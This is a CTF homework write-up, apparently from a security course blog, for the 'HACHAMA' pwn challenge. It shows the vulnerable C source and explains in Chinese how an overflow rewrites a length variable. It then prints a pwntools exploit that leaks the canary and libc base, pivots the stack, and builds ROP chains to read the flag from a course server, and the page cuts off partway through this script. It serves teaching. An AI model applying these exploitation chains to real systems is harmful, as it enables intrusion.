<!doctype html><html lang=en-us dir=ltr><head><meta charset=UTF-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content='
  Simple PWN 0x37(2023 HW - HACHAMA)
  #


  Background
  #

stack pivot
rop
bof

  Source code
  #

:::spoiler Source Code
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "SECCOMP.h"

long n;
char msg[0x20];
long n2;

struct sock_filter seccompfilter[]={
	BPF_STMT(BPF_LD | BPF_W | BPF_ABS, ArchField),
	BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, AUDIT_ARCH_X86_64, 1, 0),
	BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_KILL),
	BPF_STMT(BPF_LD | BPF_W | BPF_ABS, SyscallNum),
	Allow(open),
	Allow(openat),
	Allow(read),
	Allow(write),
	Allow(close),
	Allow(readlink),
	Allow(getdents),
	Allow(getrandom),
	Allow(brk),
	Allow(rt_sigreturn),
	Allow(exit),
	Allow(exit_group),
	BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_KILL),
};

struct sock_fprog filterprog={
	.len=sizeof(seccompfilter)/sizeof(struct sock_filter),
	.filter=seccompfilter
};

void apply_seccomp(){
	if(prctl(PR_SET_NO_NEW_PRIVS,1,0,0,0)){
		perror("Seccomp Error");
		exit(1);
	}
	if(prctl(PR_SET_SECCOMP,SECCOMP_MODE_FILTER,&amp;filterprog)==-1){
		perror("Seccomp Error");
		exit(1);
	}
	return;
}

int main(void)
{
	setvbuf(stdin, 0, 2, 0);
	setvbuf(stdout, 0, 2, 0);
	apply_seccomp();
	char buf2[0x30];
	// long n2 = 0x30;
	// char msg[0x20];
	char name[0x20];
	// long n = 20;
	n2 = 0x30;
	n = 20;
	printf("Haaton&#39;s name? ");
	n = read(0, name, n);
	name[n] = 0;
	strcpy(msg, name);
	strcat(msg, " hachamachama");
	puts(msg);
	puts("ECHO HACHAMA!");
	while (1)
	{
		read(0, buf2, n2);
		if (strcmp(buf2, "HACHAMA") == 0)
			write(1, buf2, n2);
		else
			break;
	}
	return 0;
}
:::'><meta name=theme-color media="(prefers-color-scheme: light)" content="#ffffff"><meta name=theme-color media="(prefers-color-scheme: dark)" content="#343a40"><meta name=color-scheme content="light dark"><meta property="og:url" content="https://bernie6401.github.io/security/course/ntu-cs/pwn/simple-pwn-0x372023-hw---hachama/"><meta property="og:site_name" content="SBK Hugo Site"><meta property="og:title" content="Simple PWN 0x37(2023 HW - HACHAMA)"><meta property="og:description" content='Simple PWN 0x37(2023 HW - HACHAMA) # Background # stack pivot rop bof
Source code # :::spoiler Source Code
#include <stdio.h> #include <stdlib.h> #include <string.h> #include <unistd.h> #include "SECCOMP.h" long n; char msg[0x20]; long n2; struct sock_filter seccompfilter[]={ BPF_STMT(BPF_LD | BPF_W | BPF_ABS, ArchField), BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, AUDIT_ARCH_X86_64, 1, 0), BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_KILL), BPF_STMT(BPF_LD | BPF_W | BPF_ABS, SyscallNum), Allow(open), Allow(openat), Allow(read), Allow(write), Allow(close), Allow(readlink), Allow(getdents), Allow(getrandom), Allow(brk), Allow(rt_sigreturn), Allow(exit), Allow(exit_group), BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_KILL), }; struct sock_fprog filterprog={ .len=sizeof(seccompfilter)/sizeof(struct sock_filter), .filter=seccompfilter }; void apply_seccomp(){ if(prctl(PR_SET_NO_NEW_PRIVS,1,0,0,0)){ perror("Seccomp Error"); exit(1); } if(prctl(PR_SET_SECCOMP,SECCOMP_MODE_FILTER,&amp;filterprog)==-1){ perror("Seccomp Error"); exit(1); } return; } int main(void) { setvbuf(stdin, 0, 2, 0); setvbuf(stdout, 0, 2, 0); apply_seccomp(); char buf2[0x30]; // long n2 = 0x30; // char msg[0x20]; char name[0x20]; // long n = 20; n2 = 0x30; n = 20; printf("Haaton&#39;s name? "); n = read(0, name, n); name[n] = 0; strcpy(msg, name); strcat(msg, " hachamachama"); puts(msg); puts("ECHO HACHAMA!"); while (1) { read(0, buf2, n2); if (strcmp(buf2, "HACHAMA") == 0) write(1, buf2, n2); else break; } return 0; } :::'><meta property="og:locale" content="en_us"><meta property="og:type" content="article"><meta property="article:section" content="security"><meta property="article:tag" content="Eductf"><meta property="article:tag" content="CTF"><meta property="article:tag" content="PWN"><title>Simple PWN 0x37(2023 HW - HACHAMA) | SBK Hugo Site</title>
<link rel=icon href=/favicon.png><link rel=manifest href=/manifest.json><link rel=canonical href=https://bernie6401.github.io/security/course/ntu-cs/pwn/simple-pwn-0x372023-hw---hachama/><link rel=stylesheet href=/book.min.6c8b9d2a1fc95075ed7da46ca81060b39add8fff6741ac51259f768929281e2c.css integrity="sha256-bIudKh/JUHXtfaRsqBBgs5rdj/9nQaxRJZ92iSkoHiw=" crossorigin=anonymous><script defer src=/fuse.min.js></script><script defer src=/en.search.min.acdc41c8d39e6c69d70d8a23779875e0a3733fefead3e428d5344966bb12f562.js integrity="sha256-rNxByNOebGnXDYojd5h14KNzP+/q0+Qo1TRJZrsS9WI=" crossorigin=anonymous></script></head><body dir=ltr><input type=checkbox class="hidden toggle" id=menu-control>
<input type=checkbox class="hidden toggle" id=toc-control><main class="container flex"><aside class=book-menu><div class=book-menu-content><nav><h2 class=book-brand><a class="flex align-center" href=/><span>SBK Hugo Site</span></a></h2><div class="book-search hidden"><input type=text id=book-search-input placeholder=Search aria-label=Search maxlength=64 data-hotkeys=s/><div class="book-search-spinner hidden"></div><ul id=book-search-results></ul></div><script>document.querySelector(".book-search").classList.remove("hidden")</script></nav><script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script></div></aside><div class=book-page><header class=book-header><div class="flex align-center justify-between"><label for=menu-control><img src=/svg/menu.svg class=book-icon alt=Menu></label><h3>Simple PWN 0x37(2023 HW - HACHAMA)</h3><label for=toc-control><img src=/svg/toc.svg class=book-icon alt="Table of Contents"></label></div><aside class="hidden clearfix"><nav id=TableOfContents><ul><li><a href=#background>Background</a></li><li><a href=#source-code>Source code</a></li><li><a href=#recon>Recon</a></li><li><a href=#exploit---bof--stack-pivot--rop>Exploit - BOF + Stack Pivot + ROP</a></li></ul></nav></aside></header><article class="markdown book-article"><h1 id=simple-pwn-0x372023-hw---hachama>Simple PWN 0x37(2023 HW - HACHAMA)
<a class=anchor href=#simple-pwn-0x372023-hw---hachama>#</a></h1><h2 id=background>Background
<a class=anchor href=#background>#</a></h2><p>stack pivot
rop
bof</p><h2 id=source-code>Source code
<a class=anchor href=#source-code>#</a></h2><p>:::spoiler Source Code</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdio.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdlib.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;string.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;unistd.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&#34;SECCOMP.h&#34;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>long</span> n;
</span></span><span style=display:flex><span><span style=color:#66d9ef>char</span> msg[<span style=color:#ae81ff>0x20</span>];
</span></span><span style=display:flex><span><span style=color:#66d9ef>long</span> n2;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>struct</span> <span style=color:#a6e22e>sock_filter</span> seccompfilter[]<span style=color:#f92672>=</span>{
</span></span><span style=display:flex><span>	BPF_STMT(BPF_LD <span style=color:#f92672>|</span> BPF_W <span style=color:#f92672>|</span> BPF_ABS, ArchField),
</span></span><span style=display:flex><span>	BPF_JUMP(BPF_JMP <span style=color:#f92672>|</span> BPF_JEQ <span style=color:#f92672>|</span> BPF_K, AUDIT_ARCH_X86_64, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>),
</span></span><span style=display:flex><span>	BPF_STMT(BPF_RET <span style=color:#f92672>|</span> BPF_K, SECCOMP_RET_KILL),
</span></span><span style=display:flex><span>	BPF_STMT(BPF_LD <span style=color:#f92672>|</span> BPF_W <span style=color:#f92672>|</span> BPF_ABS, SyscallNum),
</span></span><span style=display:flex><span>	Allow(open),
</span></span><span style=display:flex><span>	Allow(openat),
</span></span><span style=display:flex><span>	Allow(read),
</span></span><span style=display:flex><span>	Allow(write),
</span></span><span style=display:flex><span>	Allow(close),
</span></span><span style=display:flex><span>	Allow(readlink),
</span></span><span style=display:flex><span>	Allow(getdents),
</span></span><span style=display:flex><span>	Allow(getrandom),
</span></span><span style=display:flex><span>	Allow(brk),
</span></span><span style=display:flex><span>	Allow(rt_sigreturn),
</span></span><span style=display:flex><span>	Allow(exit),
</span></span><span style=display:flex><span>	Allow(exit_group),
</span></span><span style=display:flex><span>	BPF_STMT(BPF_RET <span style=color:#f92672>|</span> BPF_K, SECCOMP_RET_KILL),
</span></span><span style=display:flex><span>};
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>struct</span> <span style=color:#a6e22e>sock_fprog</span> filterprog<span style=color:#f92672>=</span>{
</span></span><span style=display:flex><span>	.len<span style=color:#f92672>=</span><span style=color:#66d9ef>sizeof</span>(seccompfilter)<span style=color:#f92672>/</span><span style=color:#66d9ef>sizeof</span>(<span style=color:#66d9ef>struct</span> <span style=color:#a6e22e>sock_filter</span>),
</span></span><span style=display:flex><span>	.filter<span style=color:#f92672>=</span>seccompfilter
</span></span><span style=display:flex><span>};
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>apply_seccomp</span>(){
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>if</span>(prctl(PR_SET_NO_NEW_PRIVS,<span style=color:#ae81ff>1</span>,<span style=color:#ae81ff>0</span>,<span style=color:#ae81ff>0</span>,<span style=color:#ae81ff>0</span>)){
</span></span><span style=display:flex><span>		perror(<span style=color:#e6db74>&#34;Seccomp Error&#34;</span>);
</span></span><span style=display:flex><span>		exit(<span style=color:#ae81ff>1</span>);
</span></span><span style=display:flex><span>	}
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>if</span>(prctl(PR_SET_SECCOMP,SECCOMP_MODE_FILTER,<span style=color:#f92672>&amp;</span>filterprog)<span style=color:#f92672>==-</span><span style=color:#ae81ff>1</span>){
</span></span><span style=display:flex><span>		perror(<span style=color:#e6db74>&#34;Seccomp Error&#34;</span>);
</span></span><span style=display:flex><span>		exit(<span style=color:#ae81ff>1</span>);
</span></span><span style=display:flex><span>	}
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>return</span>;
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>int</span> <span style=color:#a6e22e>main</span>(<span style=color:#66d9ef>void</span>)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>	setvbuf(stdin, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>2</span>, <span style=color:#ae81ff>0</span>);
</span></span><span style=display:flex><span>	setvbuf(stdout, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>2</span>, <span style=color:#ae81ff>0</span>);
</span></span><span style=display:flex><span>	apply_seccomp();
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>char</span> buf2[<span style=color:#ae81ff>0x30</span>];
</span></span><span style=display:flex><span>	<span style=color:#75715e>// long n2 = 0x30;
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>	<span style=color:#75715e>// char msg[0x20];
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>	<span style=color:#66d9ef>char</span> name[<span style=color:#ae81ff>0x20</span>];
</span></span><span style=display:flex><span>	<span style=color:#75715e>// long n = 20;
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>	n2 <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x30</span>;
</span></span><span style=display:flex><span>	n <span style=color:#f92672>=</span> <span style=color:#ae81ff>20</span>;
</span></span><span style=display:flex><span>	printf(<span style=color:#e6db74>&#34;Haaton&#39;s name? &#34;</span>);
</span></span><span style=display:flex><span>	n <span style=color:#f92672>=</span> read(<span style=color:#ae81ff>0</span>, name, n);
</span></span><span style=display:flex><span>	name[n] <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>	strcpy(msg, name);
</span></span><span style=display:flex><span>	strcat(msg, <span style=color:#e6db74>&#34; hachamachama&#34;</span>);
</span></span><span style=display:flex><span>	puts(msg);
</span></span><span style=display:flex><span>	puts(<span style=color:#e6db74>&#34;ECHO HACHAMA!&#34;</span>);
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>while</span> (<span style=color:#ae81ff>1</span>)
</span></span><span style=display:flex><span>	{
</span></span><span style=display:flex><span>		read(<span style=color:#ae81ff>0</span>, buf2, n2);
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>if</span> (strcmp(buf2, <span style=color:#e6db74>&#34;HACHAMA&#34;</span>) <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span>)
</span></span><span style=display:flex><span>			write(<span style=color:#ae81ff>1</span>, buf2, n2);
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>else</span>
</span></span><span style=display:flex><span>			<span style=color:#66d9ef>break</span>;
</span></span><span style=display:flex><span>	}
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>:::</p><h2 id=recon>Recon
<a class=anchor href=#recon>#</a></h2><p>:::warning
切記題目用read接，所以不需要null byte做結尾，另外題目使用的libc是ubuntu 22.04.2的版本，所以可以用docker把libc資料撈出來，再針對這個做應用
:::
這一題我覺得出的很好，有很特別的exploit，也需要用到很多前兩周學會的幾乎所有技能，包含BOF / return 2 libc / stack pivot / ROP等等</p><ol><li><p>==<strong>漏洞在哪裡???</strong>==
首先，乍看之下會不知道這個洞在哪裡，不過多try幾次或是跟一下動態會發現，他做的事情會蓋到原本==n2==的數值，導致我們之後可以輸入更多的東西
詳細來說就是:
因為在#61的地方輸入的東西被存到local variable name，而在#63會被copy到global variable ==msg==，並且和<code> hachamachama</code>合併在一起，如果一開始我們輸入的東西是20個字元，而concatenate的<code> hachamachama</code>總共13個字元，加起來就已經是==33==個字元，但如下圖所示，msg一開始的大小就被限制在32 bytes，也就是說他會蓋到後面n2的值
<img src=https://hackmd.io/_uploads/HyUsSOTBT.png alt=圖片>
從下圖可以看出來，因為長度超過的關係，原本<code>hachamachama</code>的最後一個字元，也就是0x61往後蓋到n2的值，這代表我們在往後的地方可以多加利用
<img src=https://hackmd.io/_uploads/SJUTP_aBT.png alt=圖片></p></li><li><p>知道漏洞在哪裡之後，我們就可以利用這個洞，把stack的東西leak出來</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>payload <span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;HACHAMA&#39;</span><span style=color:#f92672>.</span>ljust(<span style=color:#ae81ff>0x8</span>, <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\x00</span><span style=color:#e6db74>&#39;</span>)
</span></span><span style=display:flex><span>r<span style=color:#f92672>.</span>send(payload)
</span></span><span style=display:flex><span>result <span style=color:#f92672>=</span> r<span style=color:#f92672>.</span>recv(<span style=color:#ae81ff>0x61</span>)
</span></span><span style=display:flex><span>log<span style=color:#f92672>.</span>info(<span style=color:#e6db74>&#34;[-------------Stack Info-------------]&#34;</span>)
</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>12</span>):
</span></span><span style=display:flex><span>    log<span style=color:#f92672>.</span>info(hex(u64(result[i <span style=color:#f92672>*</span> <span style=color:#ae81ff>8</span>:i <span style=color:#f92672>*</span> <span style=color:#ae81ff>8</span> <span style=color:#f92672>+</span> <span style=color:#ae81ff>8</span>])))
</span></span><span style=display:flex><span>log<span style=color:#f92672>.</span>info(<span style=color:#e6db74>&#34;[-------------Stack Info-------------]&#34;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>canary <span style=color:#f92672>=</span> u64(result[<span style=color:#ae81ff>7</span> <span style=color:#f92672>*</span> <span style=color:#ae81ff>8</span>:<span style=color:#ae81ff>7</span> <span style=color:#f92672>*</span> <span style=color:#ae81ff>8</span> <span style=color:#f92672>+</span> <span style=color:#ae81ff>8</span>])
</span></span><span style=display:flex><span>libc_start_main <span style=color:#f92672>=</span> u64(result[<span style=color:#ae81ff>9</span> <span style=color:#f92672>*</span> <span style=color:#ae81ff>8</span>:<span style=color:#ae81ff>9</span> <span style=color:#f92672>*</span> <span style=color:#ae81ff>8</span> <span style=color:#f92672>+</span> <span style=color:#ae81ff>8</span>]) <span style=color:#f92672>-</span> <span style=color:#ae81ff>0x80</span>
</span></span><span style=display:flex><span>libc_base_addr <span style=color:#f92672>=</span> libc_start_main <span style=color:#f92672>-</span> <span style=color:#ae81ff>0x29d90</span> <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x80</span>
</span></span><span style=display:flex><span>main_fn_addr <span style=color:#f92672>=</span> u64(result[<span style=color:#ae81ff>11</span> <span style=color:#f92672>*</span> <span style=color:#ae81ff>8</span>:<span style=color:#ae81ff>11</span> <span style=color:#f92672>*</span> <span style=color:#ae81ff>8</span> <span style=color:#f92672>+</span> <span style=color:#ae81ff>8</span>])
</span></span><span style=display:flex><span>code_segment_base <span style=color:#f92672>=</span> main_fn_addr <span style=color:#f92672>-</span> <span style=color:#ae81ff>0x331</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>log<span style=color:#f92672>.</span>success(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#39;Canary = </span><span style=color:#e6db74>{</span>hex(canary)<span style=color:#e6db74>}</span><span style=color:#e6db74>&#39;</span>)
</span></span><span style=display:flex><span>log<span style=color:#f92672>.</span>success(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#39;libc start main base = </span><span style=color:#e6db74>{</span>hex(libc_start_main)<span style=color:#e6db74>}</span><span style=color:#e6db74>&#39;</span>)
</span></span><span style=display:flex><span>log<span style=color:#f92672>.</span>success(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#39;libc base addr = </span><span style=color:#e6db74>{</span>hex(libc_base_addr)<span style=color:#e6db74>}</span><span style=color:#e6db74>&#39;</span>)
</span></span><span style=display:flex><span>log<span style=color:#f92672>.</span>success(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#39;Main Function Address = </span><span style=color:#e6db74>{</span>hex(main_fn_addr)<span style=color:#e6db74>}</span><span style=color:#e6db74>&#39;</span>)
</span></span><span style=display:flex><span>log<span style=color:#f92672>.</span>success(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#39;Code Segment = </span><span style=color:#e6db74>{</span>hex(code_segment_base)<span style=color:#e6db74>}</span><span style=color:#e6db74>&#39;</span>)
</span></span></code></pre></div></li><li><p>有了canary / libc base 和code segment base / main function address，就可以來搞事了，初步的想法是直接寫一個open / read / write的syscall(因為seccomp的關係導致我們的操作極其有限)，不過因為我們也只是多了0x31的空間可以寫ROP，代表一定沒辦法把所有的shellcode都寫上去，這時候就需要用到stack pivot的技術，開一個相對大的空間繼續我們的作業，但就像@ccccc說的</p><blockquote><p>stack pivot只是把你的stack用到其他地方而已，並不會因為你換了stack的位置你就能overflow比較多</p></blockquote><p>所以比較正確的觀念是，我先利用多出來的0x31把可以用的空間開大，再寫gadget，會比較方便，如果是像lab那樣每一個步驟都切成一個stack pivot的話也不現實，因為一個操作所需要的空間一定大於0x31，隨便舉個例子，如果是open→<code>fd = open("/home/chal/flag.txt", 0);</code>，全部的payload如下:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>payload <span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;/home/chal/flag.txt&#39;</span><span style=color:#f92672>.</span>ljust(<span style=color:#ae81ff>0x38</span>, <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\x00</span><span style=color:#e6db74>&#39;</span>)
</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> flat(
</span></span><span style=display:flex><span>    canary,
</span></span><span style=display:flex><span>    <span style=color:#ae81ff>0</span>,
</span></span><span style=display:flex><span>    pop_rax_ret, <span style=color:#ae81ff>2</span>,
</span></span><span style=display:flex><span>    pop_rdi_ret, bss_addr_flag <span style=color:#f92672>-</span> <span style=color:#ae81ff>0x40</span>,
</span></span><span style=display:flex><span>    pop_rdx_rbx_ret, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>,
</span></span><span style=display:flex><span>    pop_rsi_ret, <span style=color:#ae81ff>0</span>,
</span></span><span style=display:flex><span>    syscall_ret
</span></span><span style=display:flex><span>)
</span></span></code></pre></div><p>最少也需要0x98的空間，所以擴大可以寫的空間是必要的，但我還是稍微嘮叨一下，一開始我的想法是直接把n2的數值改掉，這樣就可以解決上述的問題，但實際操作會發現這也不現實，因為payload也會過長，如下</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>payload <span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;a&#39;</span> <span style=color:#f92672>*</span> <span style=color:#ae81ff>0x38</span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> flat(
</span></span><span style=display:flex><span>    canary,
</span></span><span style=display:flex><span>    rbp,
</span></span><span style=display:flex><span>    pop_rdi_ret, n2_addr,
</span></span><span style=display:flex><span>    pop_rdx_ret, <span style=color:#ae81ff>0x200</span>,
</span></span><span style=display:flex><span>    mov_qword_ptr_rdi_rdx_ret,
</span></span><span style=display:flex><span>    main_fn_addr <span style=color:#f92672>+</span> <span style=color:#ae81ff>291</span>,
</span></span><span style=display:flex><span>)
</span></span></code></pre></div><p>這樣最少也需要0x78的空間，比起最大值的0x61還差蠻多的，所以昨天就想了超久怎麼解決這個問題</p></li><li><p>解決空間大小的問題
這個要回到動態實際執行的時候是怎麼呼叫的(如下圖)，這一題有趣的地方在這邊，理論上我們是回到main+291，讓他fetch n2的值給RAX，但如果我直接跳到main+298，並且利用rop把rax變大，是不是也有一樣的效果
<img src=https://hackmd.io/_uploads/Syoe0OTHp.png alt=圖片></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>extend_payload <span style=color:#f92672>=</span> flat(
</span></span><span style=display:flex><span>    canary,
</span></span><span style=display:flex><span>    bss_addr_flag,
</span></span><span style=display:flex><span>    pop_rax_ret, <span style=color:#ae81ff>400</span>,
</span></span><span style=display:flex><span>    main_fn_addr <span style=color:#f92672>+</span> <span style=color:#ae81ff>298</span>,
</span></span><span style=display:flex><span>)
</span></span></code></pre></div><p>此時我們就不需要那麼多的gadget幫助完成該目標</p></li><li><p>剩下的open / read / write就和lab差不多</p></li></ol><p>:::success
截至目前為止，我們的流程是</p><ol><li>設法利用overflow改變n2的數值，使我們能夠輸入更多shell code</li><li>先利用第一次的write輸入stack上的重要資訊</li><li>因為n2空間還是太小，所以我們需要先擴大能夠寫入的空間，也就是先利用第一次的stack pivot把shellcode寫上去→main+291</li><li>執行shellcode後，使rax變大再跳回去main+298</li><li>寫入真正的open / read / write讀出flag
:::</li></ol><p>:::warning
注意事項:</p><ol><li>canary
因為他有開stack protection，所以一定要對好canary在stack上的位置，可以用動態去看，依照這一題的狀況，他是會在rbp+0x40的地方</li><li>libc version
這一題因為要leak libc的base address，並且利用ROP gadget達到syscall的目的，所以一定要確定remote server使用的版本是哪一個，光知道大的版本號是有可能會失敗的，因為像我local端到最後有成功，但跑在remote就爛掉了，和@david學長討論過後的結果就是libc version有問題，實際用docker去看彼此的差異就會發現，右邊是我的→22.04.3，而左邊是實際remote的docker開出來的結果→22.04.2，所以我的作法是把docker中的東西拉出來再使用，包含在local端使用以及找gadget
<img src=https://hackmd.io/_uploads/ByiMMYTHa.png alt=圖片><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ docker cp /lib/x86_64-linux-gnu/libc.so.6 /mnt/d/Downloads/
</span></span></code></pre></div></li><li>IO problem
這個問題也是很弔詭，會發現我在最後一個send之前還有一個raw_input()，如果拿掉的話在remote一樣會爛掉，這有可能是IO之類的問題，但總之一定要加
:::</li></ol><h2 id=exploit---bof--stack-pivot--rop>Exploit - BOF + Stack Pivot + ROP
<a class=anchor href=#exploit---bof--stack-pivot--rop>#</a></h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>from</span> pwn <span style=color:#f92672>import</span> <span style=color:#f92672>*</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>r <span style=color:#f92672>=</span> process(<span style=color:#e6db74>&#39;./chal&#39;</span>, env<span style=color:#f92672>=</span>{<span style=color:#e6db74>&#34;LD_PRELOAD&#34;</span> : <span style=color:#e6db74>&#34;./libc.so.6&#34;</span>})
</span></span><span style=display:flex><span>r <span style=color:#f92672>=</span> remote(<span style=color:#e6db74>&#39;10.113.184.121&#39;</span>, <span style=color:#ae81ff>10056</span>)
</span></span><span style=display:flex><span>context<span style=color:#f92672>.</span>arch <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;amd64&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Try to trigger length exploit</span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;a&#39;</span> <span style=color:#f92672>*</span> <span style=color:#ae81ff>20</span>
</span></span><span style=display:flex><span>r<span style=color:#f92672>.</span>sendafter(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;Haaton&#39;s name? &#34;</span>, payload)
</span></span><span style=display:flex><span>print(r<span style=color:#f92672>.</span>recvlines(<span style=color:#ae81ff>2</span>))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Leak stack info</span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;HACHAMA&#39;</span><span style=color:#f92672>.</span>ljust(<span style=color:#ae81ff>0x8</span>, <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\x00</span><span style=color:#e6db74>&#39;</span>)
</span></span><span style=display:flex><span>r<span style=color:#f92672>.</span>send(payload)
</span></span><span style=display:flex><span>result <span style=color:#f92672>=</span> r<span style=color:#f92672>.</span>recv(<span style=color:#ae81ff>0x61</span>)
</span></span><span style=display:flex><span>log<span style=color:#f92672>.</span>info(<span style=color:#e6db74>&#34;[-------------Stack Info-------------]&#34;</span>)
</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>12</span>):
</span></span><span style=display:flex><span>    log<span style=color:#f92672>.</span>info(hex(u64(result[i <span style=color:#f92672>*</span> <span style=color:#ae81ff>8</span>:i <span style=color:#f92672>*</span> <span style=color:#ae81ff>8</span> <span style=color:#f92672>+</span> <span style=color:#ae81ff>8</span>])))
</span></span><span style=display:flex><span>log<span style=color:#f92672>.</span>info(<span style=color:#e6db74>&#34;[-------------Stack Info-------------]&#34;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>canary <span style=color:#f92672>=</span> u64(result[<span style=color:#ae81ff>7</span> <span style=color:#f92672>*</span> <span style=color:#ae81ff>8</span>:<span style=color:#ae81ff>7</span> <span style=color:#f92672>*</span> <span style=color:#ae81ff>8</span> <span style=color:#f92672>+</span> <span style=color:#ae81ff>8</span>])
</span></span><span style=display:flex><span>libc_start_main <span style=color:#f92672>=</span> u64(result[<span style=color:#ae81ff>9</span> <span style=color:#f92672>*</span> <span style=color:#ae81ff>8</span>:<span style=color:#ae81ff>9</span> <span style=color:#f92672>*</span> <span style=color:#ae81ff>8</span> <span style=color:#f92672>+</span> <span style=color:#ae81ff>8</span>]) <span style=color:#f92672>-</span> <span style=color:#ae81ff>0x80</span>
</span></span><span style=display:flex><span>libc_base_addr <span style=color:#f92672>=</span> libc_start_main <span style=color:#f92672>-</span> <span style=color:#ae81ff>0x29d90</span> <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x80</span>
